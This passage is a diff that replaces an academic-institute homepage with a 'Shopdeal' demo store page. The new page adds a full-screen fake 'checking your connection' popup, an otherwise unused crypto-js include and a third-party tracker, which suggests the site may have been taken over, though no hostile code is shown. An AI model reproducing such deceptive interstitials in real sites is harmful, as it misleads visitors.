@@ -1,635 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Collegiate Cognitive Academy & Advanced Pedagogy Institute — Cognitivemap</title>
-  <meta name="description" content="Rigorous academic colloquia, classical pedagogical methods, and scholarly research seminars delivered by distinguished university fellows.">
-  <link rel="canonical" href="https://cognitivemap.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <!-- SECTION 1: TOP ACADEMIC TICKER & ACCREDITATION BANNER -->
-  <div class="announcement-bar" style="background: #06101E; color: #F4F8FA; border-bottom: 1px solid rgba(0, 168, 232, 0.3);">
-    <span>◈ ACCREDITED COLLEGIATE RESEARCH COMMONS &bull; COGNITIVE ARCHITECTURE &amp; NEUROLEARNING COMMONS &bull; CLASS-1000 CLEANROOM ACTIVE &bull; 181 MERCER STREET, NY &bull; TEL: +1-888-777-5845</span>
-  </div>
 
-  <!-- Mandatory Global Site Header (Exactly 1 per page) -->
-  <header class="site-header">
-    <div class="header-container">
-      <a href="/" class="brand-logo" aria-label="Cognitivemap Home">
-        <span class="logo-mark">◈</span>
-        <span class="logo-text">Cognitivemap</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Primary Navigation">
-        <a href="/" class="nav-link active">Home</a>
-        <a href="/about.html" class="nav-link">The Atelier</a>
-        <a href="/collection.html" class="nav-link">Collections</a>
-        <a href="/blog.html" class="nav-link">Treatises</a>
-        <a href="/contact.html" class="nav-link">Concierge</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-      <div class="header-actions">
-        <a href="/collection.html" class="btn btn-sm btn-outline">Explore Catalog</a>
-        <button id="drawer-toggle" class="mobile-toggle" aria-label="Open Navigation Menu">
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-        </button>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </header>
 
-  <!-- Mandatory Mobile Navigation Drawer (Exactly 1 per page) -->
-  <div class="mobile-drawer" id="mobile-drawer" aria-hidden="true">
-    <div class="drawer-header">
-      <div class="drawer-brand">Cognitivemap</div>
-      <button id="drawer-close" class="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
-    </div>
-    <nav class="drawer-nav" aria-label="Mobile Navigation">
-      <a href="/" class="drawer-link active">Home</a>
-      <a href="/about.html" class="drawer-link">The Atelier &amp; Craft</a>
-      <a href="/collection.html" class="drawer-link">Scholastic Curricula & Research Seminars</a>
-      <a href="/blog.html" class="drawer-link">Sartorial Treatises</a>
-      <a href="/contact.html" class="drawer-link">Private Concierge</a>
-    </nav>
-    <div class="drawer-footer">
-      <p class="drawer-contact-title">Manhattan Atelier &amp; Suite</p>
-      <p class="drawer-contact-info">181 Mercer Street, New York, NY 10012, United States</p>
-      <p class="drawer-contact-info">Tel: +1-888-777-5845</p>
-      <p class="drawer-contact-info">Email: concierge@cognitivemap.com</p>
-    </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div id="drawer-overlay" class="drawer-overlay"></div>
 
-  <!-- SECTION 2: COLLEGIATE CHEMISTRY ACADEMY HERO -->
-  <section class="section hero-chemistry" style="padding: 5.5rem 0 6rem; background: linear-gradient(180deg, #E8F1F7 0%, #F4F8FA 100%);">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.15fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span class="hero-badge" style="background: rgba(11, 25, 44, 0.08); color: #0B192C; border: 1px solid rgba(11, 25, 44, 0.2);">◈ ACCREDITED COLLEGIATE ACADEMY &bull; COGNITIVE ARCHITECTURE &amp; PEDAGOGY COMMONS</span>
-          <h1 style="margin: 1.2rem 0; font-size: clamp(2.2rem, 4.5vw, 3.6rem); line-height: 1.18; color: #0B192C;">The Frontier of Cognitive Architecture &amp; Intellectual Mastery</h1>
-          <p class="lead" style="font-size: 1.15rem; line-height: 1.7; color: #1C2A39; margin-bottom: 2rem;">
-            ChemistryKeen is New York's premier collegiate academy and molecular research laboratory based at 181 Mercer Street. We empower undergraduate scholars and doctoral fellows with direct hands-on mastery of 600 MHz nuclear magnetic resonance spectrometers, tandem mass metrology, and atomic-level synthetic reaction design.
-          </p>
-          <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2.5rem;">
-            <a href="/services.html" class="btn btn-primary" style="background: #0B192C; color: #FFFFFF; border-color: #0B192C;">Explore Research Fellowships &rarr;</a>
-            <a href="#instrumentation" class="btn btn-outline" style="border-color: #0B192C; color: #0B192C;">Inspect Instrumentation Suite</a>
-            <a href="/about.html" class="btn btn-outline" style="border-color: #00A8E8; color: #0B192C;">Collegiate Campus &amp; Labs</a>
-          </div>
-          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; padding-top: 1.5rem; border-top: 1px solid rgba(11, 25, 44, 0.15);">
-            <div>
-              <div style="font-size: 1.7rem; font-weight: 700; color: #0B192C; font-family: var(--font-serif);">600 MHz</div>
-              <div style="font-size: 0.85rem; color: #526374; font-weight: 500;">Cryogenic NMR Field</div>
-            </div>
-            <div>
-              <div style="font-size: 1.7rem; font-weight: 700; color: #0B192C; font-family: var(--font-serif);">ISO Class 5</div>
-              <div style="font-size: 0.85rem; color: #526374; font-weight: 500;">Class-1000 Cleanroom</div>
-            </div>
-            <div>
-              <div style="font-size: 1.7rem; font-weight: 700; color: #0B192C; font-family: var(--font-serif);">4:1 Ratio</div>
-              <div style="font-size: 0.85rem; color: #526374; font-weight: 500;">Scholar-to-Faculty Mentorship</div>
-            </div>
-          </div>
-        </div>
-        <div style="position: relative;">
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid rgba(11, 25, 44, 0.15); background: #FFFFFF;">
-            <img src="/assets/images/blog_interdisciplinary_curriculum.jpg" alt="Collegiate Chemistry Lecture Theatre and Research Colloquium at 181 Mercer Street" style="width: 100%; height: 440px; object-fit: cover;">
-            <div style="padding: 1.5rem; background: #0B192C; color: #FFFFFF; display: flex; justify-content: space-between; align-items: center;">
-              <div>
-                <div style="font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.08em; color: #00A8E8; font-weight: 600;">Active Spectroscopy Suite</div>
-                <div style="font-weight: 600; font-size: 1rem; color: #FFFFFF;">181 Mercer Cleanroom Commons</div>
-              </div>
-              <span style="display: inline-block; padding: 0.35rem 0.8rem; border-radius: var(--radius-pill); background: rgba(0, 201, 167, 0.2); color: #00C9A7; font-size: 0.75rem; font-weight: 700; border: 1px solid rgba(0, 201, 167, 0.4);">● 4 INSTRUMENTS ONLINE</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 3: THE FOUR MOLECULAR PILLARS -->
-  <section class="section section-pillars" style="padding: 5.5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 800px; margin: 0 auto 3.5rem;">
-        <span class="hero-badge" style="background: rgba(11, 25, 44, 0.06); color: #0B192C;">CORE CURRICULUM &bull; EMPIRICAL RIGOR</span>
-        <h2 style="margin: 0.8rem 0; color: #0B192C;">The Four Pillars of Collegiate Chemical Mastery</h2>
-        <p class="lead" style="color: #526374; font-size: 1.05rem;">
-          Our academic pedagogical framework integrates classical chemical principles with advanced quantum modeling and direct instrumental experimentation.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="card" style="padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8; background: #F8FAFC;">
-          <div style="width: 46px; height: 46px; border-radius: 50%; background: #0B192C; color: #00A8E8; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; margin-bottom: 1.2rem; font-weight: 700;">⬡</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.8rem; color: #0B192C;">Mechanistic Retrosynthesis</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 0;">Dissecting complex natural products and medicinal targets into strategic synthons through asymmetric catalytic methodologies and stereochemical control.</p>
-        </div>
-        <div class="card" style="padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8; background: #F8FAFC;">
-          <div style="width: 46px; height: 46px; border-radius: 50%; background: #0B192C; color: #00C9A7; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; margin-bottom: 1.2rem; font-weight: 700;">⚛</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.8rem; color: #0B192C;">High-Field NMR Spectroscopy</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 0;">Unraveling three-dimensional conformations and reaction intermediates via multi-nuclear 1H, 13C, 31P, and 19F 2D correlation pulse sequences.</p>
-        </div>
-        <div class="card" style="padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8; background: #F8FAFC;">
-          <div style="width: 46px; height: 46px; border-radius: 50%; background: #0B192C; color: #00A8E8; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; margin-bottom: 1.2rem; font-weight: 700;">⚗</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.8rem; color: #0B192C;">Trace Ultra-High-Performance LC-MS</h3>
-          <p style="font-size: 0.92rem; color: #33383F; margin-bottom: 0;">Calibrating sub-2-micron core-shell chromatographic separation with triple-quadrupole mass metrology for sub-femtomolar analyte quantification.</p>
-        </div>
-        <div class="card" style="padding: 2rem; border-radius: var(--radius-md); border: 1px solid #D1DEE8; background: #F8FAFC;">
-          <div style="width: 46px; height: 46px; border-radius: 50%; background: #0B192C; color: #00C9A7; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; margin-bottom: 1.2rem; font-weight: 700;">⌬</div>
-          <h3 style="font-size: 1.25rem; margin-bottom: 0.8rem; color: #0B192C;">Quantum Orbital Modeling</h3>
